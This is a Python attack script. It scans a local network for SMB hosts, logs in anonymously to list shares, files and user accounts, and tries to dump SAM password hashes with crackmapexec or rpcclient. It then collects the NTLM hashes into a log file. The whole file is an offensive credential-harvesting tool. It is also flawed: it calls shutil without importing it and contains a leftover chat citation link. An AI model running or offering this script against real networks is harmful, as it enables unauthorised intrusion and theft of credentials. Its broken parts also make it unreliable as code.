#!/usr/bin/env python3
import os
import socket
import subprocess
import re


# Enumerates SMB workgroups/domains, users, shares on a LAN and attempts to retrieve NTLM hashes.

# Log file paths
hosts_log = "smb_hosts.log"
enum_log = "smb_enum.log"
hashes_log = "ntlm_hashes.log"

# Clear/initialize log files
open(hosts_log, "w").close()
open(enum_log, "w").close()
open(hashes_log, "w").close()

# Ensure required tools and libraries are installed
required_tools = ["nmap", "crackmapexec", "enum4linux"]  # external tools
for tool in required_tools:
    if not shutil.which(tool):
        print(f"[*] Installing missing tool: {tool}")
        try:
            subprocess.run(["apt-get", "update", "-y"], check=True)
            subprocess.run(["apt-get", "install", "-y", tool], check=True)
        except Exception as e:
            print(f"[!] Failed to install {tool}: {e}")

# Ensure impacket is installed (as a Python module)
try:
    from impacket import smb, smbconnection, dcerpc
except ImportError:
    print("[*] Installing impacket library...")
    subprocess.run(["pip", "install", "impacket"], check=True)
    from impacket import smb, smbconnection, dcerpc

# 1. Discover SMB hosts on the LAN
network_cidr = "192.168.1.0/24"  # Target network range
print(f"[*] Scanning network {network_cidr} for SMB hosts...")
# Using nmap to find hosts with port 445 open
nm_proc = subprocess.run(["nmap", "-p", "445", "--open", "-n", "-T4", "-oG", "-", network_cidr],
                         capture_output=True, text=True)
hosts = []
if nm_proc.returncode == 0:
    for line in nm_proc.stdout.splitlines():
        if "/open/tcp//microsoft-ds" in line or "/open/tcp//netbios-ssn" in line:
            # Parse IP from nmap grepable output line
            parts = line.split()
            if parts:
                ip = parts[1]
                hosts.append(ip)
else:
    print("[!] Nmap scan failed, falling back to manual scan...")
    # Fallback: simple socket scan on common SMB ports
    base_net = "192.168.1."
    for i in range(1, 255):
        ip = base_net + str(i)
        for port in [139, 445]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    hosts.append(ip)
                    break  # no need to check second port if one is open
            except socket.error:
                continue

# Remove duplicates and log discovered hosts
hosts = sorted(set(hosts))
with open(hosts_log, "a") as hl:
    hl.write("Discovered SMB Hosts:\n")
    for ip in hosts:
        hl.write(ip + "\n")
        print(f"Host {ip} has SMB service.")  # console output for feedback

# 2. Enumerate each host
for ip in hosts:
    with open(enum_log, "a") as elog:
        elog.write(f"\n===== Enumerating {ip} =====\n")
    print(f"[*] Enumerating {ip}...")

    # a. Get workgroup/domain and hostname using crackmapexec (quick domain/workgroup info)
    try:
        cme = subprocess.run(["crackmapexec", "smb", ip], capture_output=True, text=True, check=True)
        with open(enum_log, "a") as elog:
            elog.write("[*] crackmapexec info:\n")
            elog.write(cme.stdout)
        # CME output includes the host name and domain (or workgroup) [oai_citation_attribution:15‡github.com](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference#:~:text=SMB%20%20%20%20,SMBv1%3ATrue).
    except Exception as e:
        # If crackmapexec fails (not installed or error), skip
        with open(enum_log, "a") as elog:
            elog.write("[!] crackmapexec failed or not installed for host.\n")
    
    # b. List shares using Impacket's SMB client (anonymous login)
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(ip, ip)  # target as both remoteName and remoteHost
        conn.login('', '')  # anonymous login (empty user and password)
        shares = conn.listShares()  # list available shares
        with open(enum_log, "a") as elog:
            elog.write("[*] Shares (anonymous):\n")
            for share in shares:
                share_name = share['shi1_netname'][:-1]  # remove trailing null char
                elog.write(f"    {share_name}\n")
                print(f"    Share found: {share_name}")
                # Try to list files in the share if it's not IPC$ and accessible
                if share_name not in ["IPC$", "ADMIN$", "C$"]:
                    try:
                        conn.connectTree(share_name)
                        fid = conn.listPath(share_name, '*')
                        elog.write(f"      (Listing contents of {share_name}...)\n")
                        for f in fid:
                            fname = f.get_longname()
                            elog.write(f"        {fname}\n")
                    except Exception:
                        pass
        conn.logoff()
    except Exception as e:
        # If impacket connection fails (e.g., SMBv1 required or other issues), fallback to smbclient
        smbclient_cmd = ["smbclient", "-L", f"//{ip}/", "-N", "-g"]
        smb = subprocess.run(smbclient_cmd, capture_output=True, text=True)
        with open(enum_log, "a") as elog:
            elog.write("[*] Shares via smbclient (anonymous):\n")
            elog.write(smb.stdout)
    
    # c. Enumerate users via RPC (using Impacket's lookupsid as example)
    try:
        # Using impacket's lookupsid functionality to enumerate SIDs and hence users
        from impacket.examples import lookupsid
        # The lookupsid module can be invoked programmatically if needed; here we call it via subprocess for simplicity
        sid_cmd = ["lookupsid.py", f"\'\'@{ip}"]  # '' (empty) for username means anonymous
        sid_result = subprocess.run(" ".join(sid_cmd), shell=True, capture_output=True, text=True)
        with open(enum_log, "a") as elog:
            elog.write("[*] User accounts (RID lookup):\n")
            elog.write(sid_result.stdout)
        # The output of lookupsid will list user accounts if accessible (each user with a RID).
    except Exception as e:
        # Fallback to enum4linux if lookupsid is not available
        enum4linux_cmd = ["enum4linux", "-U", ip]  # just enumerate users
        enum4 = subprocess.run(enum4linux_cmd, capture_output=True, text=True)
        with open(enum_log, "a") as elog:
            elog.write("[*] Users via enum4linux:\n")
            elog.write(enum4.stdout)

    # d. Attempt to retrieve NTLM hashes (e.g., using crackmapexec or other)
    # Try using crackmapexec with null session to dump SAM (if vulnerability allows)
    try:
        dump = subprocess.run(["crackmapexec", "smb", ip, "--sam"], capture_output=True, text=True, check=True)
        # --sam tries to dump local SAM hashes if credentials allow or null session on old systems
        with open(enum_log, "a") as elog:
            elog.write("[*] crackmapexec SAM dump output:\n")
            elog.write(dump.stdout)
    except Exception:
        # If CME fails or isn't revealing anything, try rpcclient with lsaquery (to see if system allows anonymous SAM)
        rpc = subprocess.run(["rpcclient", "-U", "", "-N", ip, "-c", "lsaquery"], capture_output=True, text=True)
        with open(enum_log, "a") as elog:
            elog.write("[*] rpcclient lsaquery output:\n")
            elog.write(rpc.stdout)
    
    # e. Extract NTLM hashes from enumeration output and log them
    with open(enum_log, "r") as elog:
        for line in elog:
            # Simple pattern for NTLM hash: 32 hex chars (for LM) : 32 hex chars (for NTLM)
            if re.search(r'[0-9A-Fa-f]{32}:[0-9A-Fa-f]{32}', line):
                with open(hashes_log, "a") as hlog:
                    hlog.write(f"{ip} - {line}")
